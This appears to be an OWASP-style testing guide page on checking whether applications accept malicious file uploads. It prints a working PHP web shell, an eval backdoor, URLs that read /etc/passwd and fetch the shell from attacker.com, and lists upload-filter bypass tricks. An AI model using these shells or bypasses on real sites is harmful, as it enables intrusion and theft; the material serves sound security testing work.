## Summary

Many application’s business processes allow for the upload of
data/information. We regularly check the validity and security of text
but accepting files can introduce even more risk. To reduce the risk we
may only accept certain file extensions, but attackers are able to
encapsulate malicious code into inert file types. Testing for malicious
files verifies that the application/system is able to correctly protect
against attackers uploading malicious files.

Vulnerabilities related to the uploading of malicious files is unique in
that these “malicious” files can easily be rejected through including
business logic that will scan files during the upload process and reject
those perceived as malicious. Additionally, this is different from
uploading unexpected files in that while the file type may be accepted
the file may still be malicious to the system.

Finally, "malicious" means different things to different systems, for
example Malicious files that may exploit SQL server vulnerabilities may
not be considered a "malicious" to a main frame flat file environment.

The application may allow the upload of malicious files that include
exploits or shellcode without submitting them to malicious file
scanning. Malicious files could be detected and stopped at various
points of the application architecture such as: IPS/IDS, application
server anti-virus software or anti-virus scanning by application as
files are uploaded (perhaps offloading the scanning using SCAP).

## Example

Suppose a picture sharing application allows users to upload their .gif
or .jpg graphic files to the web site. What if an attacker is able to
upload a PHP shell, or exe file, or virus? The attacker may then upload
the file that may be saved on the system and the virus may spread itself
or through remote processes exes or shell code can be executed.

## How to Test

Generic Testing Method

• Review the project documentation and use exploratory testing looking
at the application/system to identify what constitutes and "malicious"
file in your environment.

• Develop or acquire a known “malicious” file. An [EICAR anti-malware
test file](http://www.eicar.org/85-0-Download.html) can be used as
harmless, but widely detected by antivirus software.

• Try to upload the malicious file to the application/system and verify
that it is correctly rejected.

• If multiple files can be uploaded at once, there must be tests in
place to verify that each file is properly evaluated.

### Exploit Payload

• Using the Metasploit payload generation functionality generates a
shellcode as a Windows executable using the Metasploit "msfpayload"
command.

• Submit the executable via the application’s upload functionality and
see if it is accepted or properly rejected.

### Malicious File

• Develop or create a file that should fail the application malware
detection process. There are many available on the Internet such as
ducklin.htm or ducklin-html.htm.

• Submit the executable via the application’s upload functionality and
see if it is accepted or properly rejected.

<http://www.eicar.org/86-0-intended-use.html>

### WebShell Backdoor

For example upload the 'WebShell-backdoor.php' to the target victim
site.

`<?php`
` if(isset($_REQUEST['cmd'])){`
` echo "<pre>";`
` $cmd = ($_REQUEST['cmd']);`
` system($cmd);`
` echo "</pre>";`
` die;`
` }`
` ?>`

Once it's uploaded, the testers/hackers may get the password by visiting
the URL below.

<http://TargetVictimSite.com/WebShell-backdoor.php?cmd=cat+/etc/passwd>

or it may execute by remote file injection as below.

<http://TargetVictimSite.com/File.php?include=http://attacker.com/WebShell-backdoor.php>

Other PHP example:

<?php @eval($_POST['password']);?>

### Invalid File

• Set up the intercepting proxy to capture the “valid” request for an
accepted file.

• Send an “invalid” request through with a valid/acceptable file
extension and see if the request is accepted or properly rejected.

### Source Code Review

When there is file upload feature supported, the following API/methods
are common to be found in the source code.

  - Java: new file, import, upload, getFileName, Download,
    getOutputString, fileOutputStream, java.io.file, export
  - C/C++: open, fopen
  - PHP: move_uploaded_file(),Readfile,
    file_put_contents(),file(),parse_ini_file(),
    copy(),fopen(),include(), require()

### Evasion of the Filter

The following techniques may be used to bypass the website file upload
checking rules and filters.

  - Change the value of 'Content-Type' as 'image/jpeg' in HTTP request
  - Change the extensions as executable extensions such as file.php5,
    file.shtml, file.asa, file.cert, file.jsp, file.jspx, file.aspx,
    file.asp, file.phtml
  - Changes of capital letters of extensions. such as file.PhP or
    file.AspX
  - Using special trailing such as spaces, dots or null characters such
    as file.asp… . file.php;jpg, file.asp%00.jpg, 1.jpg%00.php

The executable extensions should be in black list such as file.php5,
file.shtml, file.asa, file.cert, file.jsp, file.jspx, file.aspx,
file.asp, file.phtml

  - In IIS6 vulnerability, if the file name is file.asp;file.jpg,the
    file will be executed as file.asp.

`http://www.targetVictim.com/path/file.asp;file.jpg`

  - In NginX, if the original file name is test.jpg, testers/hackers may
    change it to 'test.jpg/x.php'

Once it's uploaded, the file will be executed as x.php

### Zip files path

One Zip file may contain the malicious PHP with target purpose path such
as '..\\..\\..\\..\\hacker.php' If the website doesn't check the unzip
target path, the hacker.php may unzip to the specified path.

### Zip Bomp

Upload the ZIP bomb file that may cause application denial of service.

<https://github.com/AbhiAgarwal/notes/wiki/Zip-bomb>

  - new File, file, OutputSteam, upload, import, file_put_contents,
    open, fopen

## Related Test Cases

[Test File Extensions Handling for Sensitive Information
(OTG-CONFIG-003)](Test_File_Extensions_Handling_for_Sensitive_Information_\(OTG-CONFIG-003\) "wikilink")

[Test Upload of Unexpected File Types
(OTG-BUSLOGIC-008)](Test_Upload_of_Unexpected_File_Types_\(OTG-BUSLOGIC-008\) "wikilink")

## Tools

• Metasploit's payload generation functionality

• Intercepting proxy

## References

OWASP - Unrestricted File Upload -
<https://www.owasp.org/index.php/Unrestricted_File_Upload>

Why File Upload Forms are a Major Security Threat -
<http://www.acunetix.com/websitesecurity/upload-forms-threat/>

File upload security best practices: Block a malicious file upload -
<http://www.computerweekly.com/answer/File-upload-security-best-practices-Block-a-malicious-file-upload>

Overview of Malicious File Upload Attacks -
<http://securitymecca.com/article/overview-of-malicious-file-upload-attacks/>

8 Basic Rules to Implement Secure File Uploads -
<http://software-security.sans.org/blog/2009/12/28/8-basic-rules-to-implement-secure-file-uploads>

Stop people uploading malicious PHP files via forms -
<http://stackoverflow.com/questions/602539/stop-people-uploading-malicious-php-files-via-forms>

How to Tell if a File is Malicious -
<http://www.techsupportalert.com/content/how-tell-if-file-malicious.htm>

CWE-434: Unrestricted Upload of File with Dangerous Type -
<http://cwe.mitre.org/data/definitions/434.html>

Implementing Secure File Upload -
<http://infosecauditor.wordpress.com/tag/malicious-file-upload/>

Watchful File Upload -
<http://palizine.plynt.com/issues/2011Apr/file-upload/>

Matasploit Generating Payloads -
<http://www.offensive-security.com/metasploit-unleashed/Generating_Payloads>

Project Shellcode – Shellcode Tutorial 9: Generating Shellcode Using
Metasploit <http://www.projectshellcode.com/?q=node/29>

Anti-Malware Test file - <http://www.eicar.org/86-0-Intended-use.html>

## Remediation

While safeguards such as black or white listing of file extensions,
using “Content-Type” from the header, or using a file type recognizer
may not always be protections against this type of vulnerability. Every
application that accepts files from users must have a mechanism to
verify that the uploaded file does not contain malicious code. Uploaded
files should never be stored where the users or attackers can directly
access them.